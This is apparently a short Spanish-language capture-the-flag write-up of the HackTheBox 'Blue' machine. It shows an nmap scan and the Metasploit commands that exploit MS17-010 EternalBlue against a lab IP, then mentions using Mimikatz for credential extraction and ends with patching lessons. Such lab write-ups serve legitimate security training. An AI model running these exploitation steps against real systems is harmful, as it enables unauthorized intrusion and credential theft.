---
layout: post
title: "HTB — Blue (EternalBlue)"
date: 2025-04-20
platform: HackTheBox
difficulty: easy
description: "MS17-010 · Metasploit · Mimikatz"
tags: [windows, smb, ms17-010]
---

## Reconocimiento

Empezamos con un escaneo de puertos:

```bash
nmap -sV -sC -oN blue.txt 10.10.10.40
```

El puerto `445` está abierto — SMB vulnerable a EternalBlue.

## Explotación

```bash
msfconsole
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.40
run
```

## Post-explotación

Con acceso como `SYSTEM`, usamos Mimikatz para extraer credenciales.

## Lecciones

- Siempre parchear SMB en sistemas Windows
- `MS17-010` sigue siendo común en entornos reales